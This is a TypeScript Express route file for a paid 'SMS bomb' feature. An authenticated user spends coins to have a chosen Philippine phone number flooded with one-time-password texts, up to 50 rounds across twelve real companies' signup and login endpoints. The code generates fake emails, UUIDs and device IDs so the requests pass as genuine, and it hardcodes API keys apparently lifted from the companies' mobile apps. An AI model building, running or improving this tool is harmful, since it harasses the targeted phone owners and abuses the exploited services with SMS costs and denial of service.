import { Router, type IRouter, type Request } from "express";
import { db, usersTable, transactionsTable } from "@workspace/db";
import { eq } from "drizzle-orm";
import { requireAuth } from "../middlewares/auth";

const router: IRouter = Router();

type UserRequest = Request & { user: typeof usersTable.$inferSelect };

const COIN_COST = 3;

function formatPh(phone: string): string {
  const d = phone.replace(/\D/g, "");
  if (d.startsWith("0")) return d.slice(1);
  if (d.startsWith("63")) return d.slice(2);
  return d;
}

function randStr(n: number): string {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  let r = "";
  for (let i = 0; i < n; i++) r += chars[Math.floor(Math.random() * chars.length)];
  return r;
}

function randEmail(): string {
  return randStr(10) + "@gmail.com";
}

function randUuid(): string {
  return `${randStr(8)}-${randStr(4)}-${randStr(4)}-${randStr(4)}-${randStr(12)}`;
}

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

interface SmsService {
  name: string;
  send: (phone: string) => Promise<{ success: boolean; reason?: string }>;
}

const SMS_SERVICES: SmsService[] = [
  {
    name: "MWELL",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number", {
          method: "POST",
          headers: {
            "ocp-apim-subscription-key": "0a57846786b34b0a89328c39f584892b",
            "x-app-version": "03.942.038",
            "x-device-type": "android",
            "x-timestamp": String(Date.now()),
            "x-request-id": randStr(16),
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ country: "PH", phoneNumber: p, phoneNumberPrefix: "+63" }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "PEXX",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1", {
          method: "POST",
          headers: { "tid": randStr(11), "appversion": "3.0.14", "Content-Type": "application/json" },
          body: JSON.stringify({ "0": { json: { areaCode: "+63", phone: `+63${p}`, otpUsage: "REGISTRATION" } } }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "EZLOAN",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://gateway.ezloancash.ph/security/auth/otp/request", {
          method: "POST",
          headers: { "source": "EZLOAN", "Content-Type": "application/json" },
          body: JSON.stringify({ businessId: "EZLOAN", contactNumber: `+63${p}`, appsflyerIdentifier: randUuid() }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "XPRESS",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ FirstName: "User", LastName: "Test", Email: randEmail(), Phone: `+63${p}`, Password: "Password123!" }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "BAYAD",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://api.online.bayad.com/api/sign-up/otp", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mobileNumber: `+63${p}`, emailAddress: randEmail() }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "LBC",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const body = new URLSearchParams({ verification_type: "mobile", client_contact_no: p });
        const res = await fetch("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: body.toString(),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "PICKUP",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://production.api.pickup-coffee.net/v2/customers/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ mobile_number: `+63${p}`, login_method: "mobile_number" }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "HONEYLOAN",
    send: async (phone) => {
      try {
        const res = await fetch("https://api.honeyloan.ph/api/client/registration/step-one", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phone, is_rights_block_accepted: 1 }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "KUMU",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch("https://api.kumuapi.com/v2/user/sendverifysms", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ country_code: "+63", cellphone: p, encrypt_timestamp: Math.floor(Date.now() / 1000) }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: [200, 403].includes(res.status) };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "S5",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const body = new URLSearchParams({ phone_number: `+63${p}` });
        const res = await fetch("https://api.s5.com/player/api/v1/otp/request", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: body.toString(),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "CASHALO",
    send: async (phone) => {
      const p = formatPh(phone);
      const dev = randStr(16);
      try {
        const res = await fetch("https://api.cashaloapp.com/access/register", {
          method: "POST",
          headers: {
            "x-api-key": "UKgl31KZaZbJakJ9At92gvbMdlolj0LT33db4zcoi7oJ3/rgGmrHB1ljINI34BRMl+DloqTeVK81yFSDfZQq+Q==",
            "x-device-identifier": dev,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ phone_number: p, device_identifier: dev, device_type: 1 }),
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
  {
    name: "BISTRO",
    send: async (phone) => {
      const p = formatPh(phone);
      try {
        const res = await fetch(`https://bistrobff-adminservice.arlo.com.ph:9001/api/v1/customer/loyalty/otp?mobileNumber=63${p}`, {
          signal: AbortSignal.timeout(12000),
        });
        return { success: res.status === 200 };
      } catch { return { success: false, reason: "Timeout" }; }
    },
  },
];

router.post("/sms/bomb", requireAuth, async (req: Request, res): Promise<void> => {
  const user = (req as UserRequest).user;

  const { phone, quantity, delayMs } = req.body as {
    phone?: string;
    quantity?: unknown;
    delayMs?: unknown;
  };

  if (!phone || typeof phone !== "string") {
    res.status(400).json({ error: "Phone number required." });
    return;
  }

  const p = formatPh(phone);
  if (p.length !== 10 || !p.startsWith("9")) {
    res.status(400).json({ error: "Invalid Philippine phone number. Must be 09XXXXXXXXX." });
    return;
  }

  const qty = Math.min(Math.max(parseInt(String(quantity)) || 1, 1), 50);
  const delay = Math.min(Math.max(parseInt(String(delayMs)) || 500, 0), 3000);

  if (user.balance < COIN_COST) {
    res.status(402).json({ error: `Insufficient coins. Need ${COIN_COST} coins but you have ${user.balance}.` });
    return;
  }

  await db.update(usersTable).set({ balance: user.balance - COIN_COST }).where(eq(usersTable.id, user.id));
  await db.insert(transactionsTable).values({
    userId: user.id,
    type: "spend",
    amount: COIN_COST,
    status: "approved",
    note: `SMS Bomb: +63${p} x${qty} rounds`,
  });

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  const sse = (data: object) => {
    if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`);
  };

  const totalOps = qty * SMS_SERVICES.length;
  let sent = 0;
  let failed = 0;
  let ops = 0;

  sse({ type: "start", phone: `+63${p}`, quantity: qty, services: SMS_SERVICES.length, coinsSpent: COIN_COST, remainingBalance: user.balance - COIN_COST });

  for (let round = 1; round <= qty; round++) {
    for (const svc of SMS_SERVICES) {
      if (res.writableEnded) break;

      const result = await svc.send(p);
      ops++;

      if (result.success) sent++;
      else failed++;

      sse({
        type: "log",
        service: svc.name,
        phone: `+63${p}`,
        success: result.success,
        reason: result.reason,
        round,
        sent,
        failed,
        progress: Math.round((ops / totalOps) * 100),
        ts: new Date().toISOString(),
      });

      if (delay > 0 && !(round === qty && svc === SMS_SERVICES[SMS_SERVICES.length - 1])) {
        await sleep(delay);
      }
    }
    if (res.writableEnded) break;
  }

  sse({ type: "done", sent, failed, total: totalOps });
  res.end();
});

export default router;
